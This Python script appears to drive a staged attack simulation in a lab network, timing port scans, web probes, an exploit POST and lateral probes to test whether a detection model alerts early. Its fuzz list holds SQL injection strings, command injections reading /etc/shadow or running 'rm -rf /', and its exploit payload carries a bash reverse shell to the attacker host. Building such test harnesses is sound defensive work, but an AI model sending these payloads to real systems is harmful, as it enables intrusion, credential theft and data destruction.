#!/usr/bin/env python3
"""
workloads/attacker_scenario.py
Controlled, repeatable multi-stage attack scenario for CyberWorld demonstration.
Executed exclusively from clab-enterprise-attacker (192.168.100.10).

Stages:
1. RECONNAISSANCE: Port scanning & service discovery against DMZ.
2. SUSPICIOUS_PROBING: High-entropy HTTP fuzzing and SQLi/injection pattern probing on DMZ Web.
3. EXPLOIT_ATTEMPT: Automated payload delivery & command injection simulation on DMZ.
4. LATERAL_PIVOT_ATTEMPT: Simulated pivot probing targeting internal network (blocked by perimeter).

Instruments exact start and milestone timestamps to prove:
  T_model_alert < T_actual_attack_stage
"""

import json
import os
import socket
import sys
import time
import urllib.parse
import urllib.request
from typing import Dict, List, Any

DMZ_HOST = "10.0.3.10"
DMZ_WEB_URL = f"http://{DMZ_HOST}:80"
INTERNAL_APP_HOST = "10.0.2.40"
INTERNAL_DB_HOST = "10.0.2.50"

PORTS_TO_SCAN = [
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
    443, 445, 1433, 1521, 3306, 3389, 5432, 8000, 8080, 8443
]

FUZZ_PATHS = [
    "/admin",
    "/admin/login.php",
    "/manager/html",
    "/api/v1/system/debug",
    "/.env",
    "/wp-config.php.bak",
    "/actuator/health",
    "/api/v1/customers?search=' UNION SELECT 1,username,password FROM users--",
    "/api/v1/exec?cmd=cat%20/etc/shadow",
    "/login?user=admin' OR '1'='1'--",
    "/shell.php?cmd=id;whoami;uname -a",
    "/cgi-bin/test.cgi?cmd=rm -rf /"
]


def log_event(stage: str, message: str, timestamp: float = None):
    ts = timestamp or time.time()
    timestr = time.strftime('%H:%M:%S', time.localtime(ts))
    print(f"[{timestr}] [ATTACKER] [{stage}] {message}")
    sys.stdout.flush()


def run_reconnaissance(target_ip: str = DMZ_HOST, duration_sec: float = 6.0) -> Dict[str, Any]:
    """Stage 1: Multi-port vertical and horizontal scanning sweep."""
    t_start = time.time()
    log_event("STAGE 1: RECONNAISSANCE", f"Starting TCP port scan sweep on {target_ip}...")
    probes_sent = 0

    end_time = t_start + duration_sec
    while time.time() < end_time:
        for port in PORTS_TO_SCAN:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.08)
                sock.connect_ex((target_ip, port))
                sock.close()
                probes_sent += 1
            except Exception:
                pass
            time.sleep(0.02)

    t_end = time.time()
    log_event("STAGE 1: RECONNAISSANCE", f"Completed {probes_sent} scan probes in {t_end - t_start:.2f}s.")
    return {"stage": "RECONNAISSANCE", "start": t_start, "end": t_end, "probes": probes_sent}


def run_suspicious_probing(target_url: str = DMZ_WEB_URL, duration_sec: float = 8.0) -> Dict[str, Any]:
    """Stage 2: High-entropy HTTP fuzzing and web injection probing."""
    t_start = time.time()
    log_event("STAGE 2: SUSPICIOUS_PROBING", f"Launching web attack & injection probing against {target_url}...")
    requests_sent = 0

    end_time = t_start + duration_sec
    while time.time() < end_time:
        for path in FUZZ_PATHS:
            try:
                url = target_url + path
                req = urllib.request.Request(
                    url,
                    headers={
                        "User-Agent": "sqlmap/1.6#stable (https://sqlmap.org)",
                        "Accept": "*/*",
                        "X-Forwarded-For": "192.168.100.10"
                    }
                )
                with urllib.request.urlopen(req, timeout=1.0) as resp:
                    resp.read()
                requests_sent += 1
            except Exception:
                requests_sent += 1
            time.sleep(0.08)

    t_end = time.time()
    log_event("STAGE 2: SUSPICIOUS_PROBING", f"Sent {requests_sent} malicious HTTP probes in {t_end - t_start:.2f}s.")
    return {"stage": "SUSPICIOUS_PROBING", "start": t_start, "end": t_end, "requests": requests_sent}


def run_exploit_attempt(target_url: str = DMZ_WEB_URL, duration_sec: float = 6.0) -> Dict[str, Any]:
    """Stage 3: Automated payload delivery & command injection simulation on DMZ."""
    t_start = time.time()
    log_event("STAGE 3: EXPLOIT_ATTEMPT", f"Delivering simulated web exploit payload to {target_url}...")
    payloads_sent = 0

    payload_data = json.dumps({
        "exploit": "CVE-2024-EXEMPLAR",
        "command": "/bin/sh -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'",
        "padding": "A" * 2048
    }).encode("utf-8")

    end_time = t_start + duration_sec
    while time.time() < end_time:
        try:
            req = urllib.request.Request(
                f"{target_url}/api/v1/system/exec",
                data=payload_data,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "ExploitFramework/4.2",
                    "X-Exploit-Vector": "RemoteCodeExecution"
                }
            )
            with urllib.request.urlopen(req, timeout=1.5) as resp:
                resp.read()
            payloads_sent += 1
        except Exception:
            payloads_sent += 1
        time.sleep(0.2)

    t_end = time.time()
    log_event("STAGE 3: EXPLOIT_ATTEMPT", f"Sent {payloads_sent} exploit payloads in {t_end - t_start:.2f}s.")
    return {"stage": "EXPLOIT_ATTEMPT", "start": t_start, "end": t_end, "payloads": payloads_sent}


def run_lateral_pivot_attempt(internal_targets: List[str] = None, duration_sec: float = 6.0) -> Dict[str, Any]:
    """Stage 4: Simulated pivot attempt towards internal subnets (The Target Event to Pre-empt)."""
    t_start = time.time()
    targets = internal_targets or [f"{INTERNAL_APP_HOST}:8000", f"{INTERNAL_DB_HOST}:5432"]
    log_event("STAGE 4: LATERAL_PIVOT_ATTEMPT", f"Attempting lateral movement into internal zone ({targets})...")
    pivot_attempts = 0

    end_time = t_start + duration_sec
    while time.time() < end_time:
        for target in targets:
            host, port_s = target.split(":")
            port = int(port_s)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.2)
                sock.connect_ex((host, port))
                sock.close()
                pivot_attempts += 1
            except Exception:
                pivot_attempts += 1
            time.sleep(0.1)

    t_end = time.time()
    log_event("STAGE 4: LATERAL_PIVOT_ATTEMPT", f"Completed {pivot_attempts} pivot attempts in {t_end - t_start:.2f}s.")
    return {"stage": "LATERAL_PIVOT_ATTEMPT", "start": t_start, "end": t_end, "attempts": pivot_attempts}


def execute_full_attack_campaign(delay_before_start: float = 0.0) -> Dict[str, Any]:
    """
    Coordinates the complete multi-stage progression:
    Reconnaissance -> Suspicious Probing -> Exploit Delivery -> Lateral Pivot
    """
    if delay_before_start > 0:
        log_event("CAMPAIGN", f"Holding pre-attack baseline period for {delay_before_start:.1f}s...")
        time.sleep(delay_before_start)

    t_campaign_start = time.time()
    log_event("CAMPAIGN", "=== COMMENCING CONTROLLED ATTACK SCENARIO ===")

    # 1. Reconnaissance (Port Scan)
    s1 = run_reconnaissance(duration_sec=6.0)
    time.sleep(1.0)

    # 2. Suspicious Probing (HTTP Fuzzing & SQLi)
    s2 = run_suspicious_probing(duration_sec=8.0)
    time.sleep(1.0)

    # 3. Exploit Delivery
    s3 = run_exploit_attempt(duration_sec=6.0)
    time.sleep(1.0)

    # 4. Lateral Movement Probe (The Target Milestone)
    t_actual_milestone = time.time()
    log_event("CAMPAIGN", f"*** TARGET MILESTONE REACHED (T_actual = {t_actual_milestone:.3f}) ***")
    s4 = run_lateral_pivot_attempt(duration_sec=6.0)

    t_campaign_end = time.time()
    log_event("CAMPAIGN", "=== ATTACK CAMPAIGN COMPLETE ===")

    timeline = {
        "campaign_start": t_campaign_start,
        "campaign_end": t_campaign_end,
        "t_actual_milestone": t_actual_milestone,
        "stages": [s1, s2, s3, s4]
    }
    return timeline


if __name__ == "__main__":
    delay = float(sys.argv[1]) if len(sys.argv) > 1 else 0.0
    res = execute_full_attack_campaign(delay_before_start=delay)
    # Output JSON summary to stdout
    print("\n--- ATTACK TIMELINE JSON ---")
    print(json.dumps(res, indent=2))
